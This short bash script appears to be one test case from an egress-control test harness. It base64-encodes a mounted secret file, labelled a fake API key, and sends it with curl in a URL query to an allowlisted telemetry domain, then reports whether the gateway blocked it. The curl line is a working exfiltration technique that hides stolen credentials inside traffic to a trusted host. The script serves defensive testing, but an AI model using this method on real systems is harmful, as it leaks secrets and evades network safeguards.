#!/usr/bin/env bash
# Bonus attack — exfiltrate the secret through the ALLOWED telemetry domain.
# The destination (logs.trusted.local) is on the egress allowlist; the payload
# (the secret, base64-encoded) is not inspected by a naive allowlist.
set -uo pipefail
SECRET="/run/secrets/fake_api_key"
URL="${ALLOWED_URL:-http://logs.trusted.local:9000/telemetry}"

if [ ! -r "$SECRET" ]; then
  echo "RESULT|bonus_exfil_allowed_domain|BLOCKED|secret not mounted"
  exit 0
fi

data="$(base64 -w0 "$SECRET" 2>/dev/null || base64 "$SECRET" | tr -d '\n')"
echo "[bonus] sending secret to ALLOWLISTED domain: $URL"

code="$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "${URL}?event=telemetry&d=${data}" 2>/dev/null || echo 000)"
if [ "$code" = "200" ]; then
  echo "RESULT|bonus_exfil_allowed_domain|SUCCESS|secret left via allowlisted domain (HTTP 200)"
else
  echo "RESULT|bonus_exfil_allowed_domain|BLOCKED|inspecting gateway refused payload (HTTP ${code})"
fi
